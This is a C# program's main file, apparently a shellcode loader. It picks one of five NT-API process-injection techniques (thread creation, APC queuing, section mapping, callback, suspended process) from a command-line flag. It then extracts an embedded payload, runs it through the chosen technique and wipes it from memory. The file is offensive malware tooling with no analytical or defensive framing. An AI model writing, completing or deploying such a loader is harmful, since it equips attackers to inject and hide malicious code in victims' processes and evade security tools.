using System;

class Program
{
    static readonly (string Name, Func<byte[], bool> Fn)[] Techniques =
    {
        ("nt_thread", NtThread.Run),
        ("nt_apc", NtApc.Run),
        ("nt_section", NtSection.Run),
        ("nt_callback", NtCallback.Run),
        ("nt_suspended", NtSuspended.Run),
    };

    static int Main(string[] args)
    {
        int techIdx = Config.DefaultTechnique;
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "-t" && i + 1 < args.Length)
            {
                if (int.TryParse(args[i + 1], out int v))
                    techIdx = v;
                i++;
            }
        }

        if (techIdx < 0 || techIdx >= Techniques.Length)
            return 1;

        byte[] sc = Payload.Extract();
        if (sc.Length == 0)
            return 1;

        bool ok = Techniques[techIdx].Fn(sc);
        Payload.Wipe(sc);
        return ok ? 0 : 1;
    }
}
